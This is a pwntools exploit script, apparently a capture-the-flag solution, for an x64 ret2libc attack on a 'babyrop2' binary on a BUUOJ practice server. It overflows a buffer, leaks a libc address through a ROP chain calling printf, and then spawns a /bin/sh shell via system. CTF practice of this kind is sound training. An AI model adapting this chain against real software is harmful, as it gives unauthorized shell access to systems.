#Made by fly_autumn
#x64 ret2libc
from pwn import *
#p = process("./babyrop2")
p = remote("node5.buuoj.cn",27225)
elf = ELF("./babyrop2")
context(os="linux",arch="amd64")
libc = ELF("./libc.so.6")

offset = 40
pop_rdi = 0x400733
ret = 0x4004d1
printf_plt = elf.plt["printf"]
read_got = elf.got["read"]
main_addr = 0x400636
forma = 0x400790
pop_rsi_r15 = 0x400731

p.recvuntil(b"name? ")
payload = b"\x00" * offset + p64(pop_rdi) + p64(forma) + p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main_addr)
p.sendline(payload)
read_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\0"))
log.success("read addr: "+hex(read_addr))
libc_addr = read_addr - libc.sym["read"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("sys addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search("/bin/sh"))
log.success("sh addr: "+hex(sh_addr))

p.recvuntil(b"name? ")
payload = b"\x00" * offset + p64(ret) + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)
p.sendline(payload)

p.interactive()
